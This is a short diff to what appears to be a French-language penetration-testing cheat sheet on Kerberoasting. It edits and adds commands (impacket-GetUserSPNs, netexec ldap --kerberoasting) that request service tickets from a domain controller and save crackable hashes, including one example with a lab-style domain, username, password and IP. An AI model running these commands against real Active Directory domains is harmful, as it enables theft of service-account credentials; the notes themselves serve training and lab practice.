@@ -87,10 +87,12 @@ impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
 
 
 ## Récupérer le ticket TGS du compte
-impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP -request
+impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
 
 # Récupération du hash pour un user spécifique dans un fichier précis
 impacket-GetUserSPNs delegate.vl/'A.Briggs':'P4ssw0rd1#123' -dc-ip 10.129.234.69 -request -request-user N.Thompson -outputfile N.Thompson.TGS
+
+netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' --kerberoasting hash.txt
 ```
 
 
